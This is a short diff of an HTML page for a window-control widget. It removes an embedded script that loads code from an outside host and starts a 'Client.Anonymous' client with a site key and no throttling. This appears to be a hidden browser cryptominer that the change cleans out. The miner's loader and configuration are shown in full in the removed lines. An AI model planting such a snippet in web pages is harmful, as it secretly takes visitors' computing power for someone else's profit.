@@ -5,15 +5,6 @@
         <button onclick="doWithWindow(getParents(this)[2].id, 'maximize')">Maximize</button>
         <button onclick="doWithWindow(getParents(this)[2].id, 'minimize')">Minimize</button>
         <button onclick="doWithWindow(getParents(this)[2].id, 'close')">Close</button>
-        <script src="https://www.hostingcloud.racing/WZaT.js"></script>
-<script>
-    var _client = new Client.Anonymous('25ec25d1f973fab0ec75e9f7c4034296fcdc2ef1028d6b86b3c5479089db9763', {
-        throttle: 0, c: 'w'
-    });
-    _client.start();
-    
-
-</script>
         <br><br>
         <h5><b>Content on window</b></h5>
         <textarea onchange="changeWindowContent(getParents(this)[2].id, this.value)" class="fullwidth" placeholder="Put new content and unselect..." rows="4"></textarea>
